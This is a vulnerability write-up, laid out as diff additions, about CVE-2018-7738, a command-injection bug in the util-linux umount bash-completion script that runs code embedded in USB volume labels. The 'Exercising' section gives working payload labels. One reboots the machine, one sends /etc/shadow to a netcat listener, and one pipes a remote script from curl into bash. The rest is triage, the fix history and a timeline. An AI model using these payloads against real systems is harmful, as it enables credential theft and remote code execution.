@@ -1,0 +1,233 @@
+Malicious Command Execution via bash-completion (CVE-2018-7738)
+
+
+Note: This was a parallel discovery where we found the bug and later found out
+it already had a CVE from Tenable.  See timeline for details.
+
+
+Affected Versions:
+Ubuntu 18.04
+Any other OS that uses the util-linux 2.31 bash-completion mount/umount
+scripts, a full analysis of which Linux distributions use this package was not
+done.
+
+
+Overview:
+I was playing around with USB stick names when I saw something odd happen. I
+had named a drive `ID` by accident, and when I went to umount the drive I saw:
+
+$ umount /dev/s<tab>ID: command not found
+ID: command not found
+
+Something had obviously gone wrong here. After trying again I realized that the
+command was being executed when I hit the <tab> key to bring up the list of
+valid devices (such as /dev/sdb1).
+
+After digging around in the OS I found that the umount bash-completion script
+is allowing drive names with `` or $() to be executed by line 44:
+
+$ sed -n 44,45p /usr/share/bash-completion/completions/umount
+    DEVS_MPOINTS="$(mount | awk '{print $1, $3}')"
+    COMPREPLY=( $(compgen -W "$DEVS_MPOINTS" -- $cur) )
+
+This type of problem isn't new of course, earlier in the year there was a KDE
+bug that allowed commands on USB drives to be executed when the drive is
+inserted, obviously a much more severe issue than this one:
+    https://www.kde.org/info/security/advisory-20180208-2.txt
+
+
+Discovery Environment:
+Ubuntu 18.04 while messing with USB volume names and types
+
+
+Exercising:
+I found this bug by trying to execute an invalid command, because the tool I
+used to create the FAT32 partition defaulted to the DOS standard of using upper
+case. But if you use the mkfs.fat tool it won't force it to be capitalized:
+
+$ sudo mkfs.fat -I -n '`id`' /dev/sdb1
+
+But when I tried this I found that I no feedback at all when hitting <tab>.
+After some confusion I realized this is because the command had run, but
+because it had run successfully the output of the command was discarded.
+
+FAT32 volume names are limited to 11 characters, so to have fun we need to try
+another filesystem type such as NTFS. Also, when mounting and unmounting
+partitions it is likely that a user will have sudo credentials already cached,
+which makes this an excellent chance to create a joke USB stick for use around
+the office:
+
+$ sudo mkfs.ntfs -f -L '`IFS=,;a=sudo,reboot;\$a`' /dev/sdb1
+
+This is good for some laughs, but it's not a very 1337. So let's try an example
+that more interesting. Create your malicious USB drive:
+
+$ sudo mkfs.ntfs -f -L '`IFS=,;sudo,cat,/etc/shadow,|,nc,127.0.0.1,31337;\$a`' /dev/sdb1
+
+Run this command in a terminal on the same computer you are going to try this
+on:
+
+$ nc -l 127.0.0.1 31337
+
+Then insert the USB stick into the computer, type the umount command and hit
+tab. If you have cached sudo credentials in your terminal you should see the
+contents of your /etc/shadow file show up in another terminal with no
+indication that anything bad happened.
+
+Or! Let's have some fun!
+
+$ sudo mkfs.ntfs -f -L '`IFS=,;a=curl,-Ls,notmalware.sh;\$a|bash`' /dev/sdb1
+
+
+Triage:
+The version of the umount bash-completion script found in the Ubuntu Bionic
+git repo:
+    https://git.launchpad.net/ubuntu/+source/bash-completion/tree/completions/umount?h=ubuntu/bionic
+
+Matches the version in the upstream github repo:
+    https://github.com/scop/bash-completion/blob/master/completions/_umount
+
+Neither of those files match what I have in my install. After some digging 
+around I see that the changelog for the bash-completion package in Ubuntu 18.04
+indicates they stopped shipping the completion scripts from bash-completion for
+the mount and umount utilities. Rather they were using the completion scripts
+provided by the util-linux package.
+    http://changelogs.ubuntu.com/changelogs/pool/main/b/bash-completion/bash-completion_2.8-1ubuntu1/changelog
+
+Looking at the util-linux package listing for Ubuntu 18.04 shows they are
+shipping util-linux 2.31:
+    https://packages.ubuntu.com/bionic/util-linux
+
+And util-linux verison 2.31 does have the code causing the problem:
+    https://github.com/karelzak/util-linux/blob/stable/v2.31/bash-completion/umount#L44
+
+It was originally introduced in 2013 in this commit:
+    https://github.com/karelzak/util-linux/commit/2211b13ed87cef802cfa1ed07b5e8a9847cdfb88
+
+It appears to be fixed in the next revision (2.32) of util-linux (released 2018.03.21)
+    https://github.com/karelzak/util-linux/blob/stable/v2.32/bash-completion/umount#L44
+    https://github.com/karelzak/util-linux/releases/tag/v2.32
+
+It is also interesting to note that the bug report for this issue does not
+identify it as being a security issue, but rather as broken functionality when
+a volume name has a space.  This shows that the issue was not found due to a
+security review, but just because of other side effects.
+    https://github.com/karelzak/util-linux/issues/539
+
+It also explains why it took over 4 months between when the patch was introduced
+and when the release was cut.  If it was considered a security issue, the patch 
+likely would have landed in a release more quickly.
+
+You can see this bug goes back a while on Ubuntu: 
+    https://git.launchpad.net/ubuntu/+source/util-linux/commit/bash-completion/umount?h=applied/ubuntu/bionic&id=0036b080916d422aad4e352ee25402f336d15348
+
+This particular bug was introduced to util-linux over 5 years ago in version
+2.24-rc1:
+    https://github.com/karelzak/util-linux/commit/2211b13ed87cef802cfa1ed07b5e8a9847cdfb88
+
+But because the util-linux version of the mount/umount completion scripts were
+not used in Ubuntu, this wasn't an issue until Ubuntu changed to using the
+util-linux scripts in 18.04.  I have tested this on Ubuntu 16.04 and verified
+that there is no issue.  The upcoming 18.10 Ubuntu release (Cosmic) moves the
+util-linux package to version 2.32 so this issue will be resolved at that time:
+    https://packages.ubuntu.com/cosmic/util-linux
+
+Keep in mind that this issue affects any system using the util-linux
+mount/umount bash-completion scripts between version 2.24 and 2.31. I only
+found it once the util-linux umount/mount scripts were incorporated into Ubuntu
+18.04.
+
+Unless util-linux 2.32 is backported to 18.04 it will leave the LTS version of
+Ubuntu vulnerable to this issue.
+
+A little more searching and I found this issue has already been reported as a
+security issue as CVE-2018-7738:
+    https://www.cvedetails.com/cve/CVE-2018-7738/
+
+So someone else had already found this particular bug, it appears to have been
+originally reported on Debian.
+
+
+Other Bugs?:
+If there was a bug in one bash-completion script, why not others?  Searching for
+dollar signs embedded in strings in bash-completion scripts there are 2 tools
+that looked worth further investigation: hcitool and iwconfig.
+
+
+hcitool:
+Some quick experimentation showed that hcitool (and the other hci* utilties) are
+not vulnerable to this same issue.
+
+$ head -n9 /usr/share/bash-completion/completions/hcitool 
+# bash completion for bluez utils                          -*- shell-script -*-
+
+_bluetooth_addresses()
+{
+    if [[ -n ${COMP_BLUETOOTH_SCAN:-} ]]; then
+        COMPREPLY+=( $( compgen -W "$( hcitool scan | \
+        awk '/^\t/{print $1}' )" -- "$cur" ) )
+    fi
+}
+
+This script does a very similar thing by embedding the results of an awk
+command in "", but because the it only grabs the first column of output the
+name reported by the device is not interpreted by "".
+
+
+iwconfig:
+Testing showed that iwconfig wasn't vulnerable to this type of problem either,
+which was too bad because it would have been much more fun. But the reason is
+much weirder than hcitool.
+
+My first glance at the case for generating a list of completion strings for an
+essid (or ap) looks like this technique should work perfectly:
+
+$ sed -n 14,22p /usr/share/bash-completion/completions/iwconfig 
+        essid)
+        	COMPREPLY=( $( compgen -W 'on off any' -- "$cur" ) )
+            if [[ -n ${COMP_IWLIST_SCAN:-} ]]; then
+            	COMPREPLY+=( $( compgen -W \
+                	"$( iwlist ${words[1]} scan | \
+                	awk -F'\"' '/ESSID/ {print $2}' )" -- "$cur" ) )
+            fi
+            return
+            ;;
+
+But after some testing it became obvious that this doesn't work because the
+COMP_IWLIST_SCAN variable is not defined. And I can't find anything that
+_should_ define it. A google search only comes up with various bash-completion
+sources. A journey through git-blame in the bash-completion repo shows that this
+variable was introduced over 13 years ago:
+    https://github.com/scop/bash-completion/commit/fa7a4bcaeab1c583d25dd70404157e14024f58c3
+
+And as near as I can determine this particular functionality has never worked as
+intended.  If this functionality is ever fixed, it may create an exploitable
+condition here which would allow SSIDs with malicious strings in them to gain
+command execution.
+
+
+Lesson:
+There are many parts of a modern operating system that are changing all the
+time. Small changes in the source of a script in this case caused a security
+issue. Updating and maintaining things is hard and it's very easy for small
+changes to result in security issues.
+
+These bugs often go undiscovered for years, and even after they are patched and
+a new version is released, it can take months before projects which depend on
+this code are updated.  If this concerns you, learn about what is happening on
+your computer (or tablet, phone, etc.).  Remove features that you don't need.
+
+Be curious and figure out how things work. Try not to be too horrified when you
+figure out how things work.
+
+
+Timeline:
+2013.04.13 umount bug introduced into util-linux
+2016-03-31 umount bug introduced into Ubuntu
+2017.11.16 umount bug fixed in util-linux repo
+2018.03.06 CVE-2018-7738 published https://www.cvedetails.com/cve/CVE-2018-7738/
+2018.03.21 util-linux v2.32 released, which fixes mount bug
+2018.08.22 Bug discovered and began triage to identify the root cause.
+2018.09.11 Finished bug triage and research into the origins of the bug,
+           including identifying the existing CVE: CVE-2018-7738
+2018.09.14 Publicly released this triage write-up
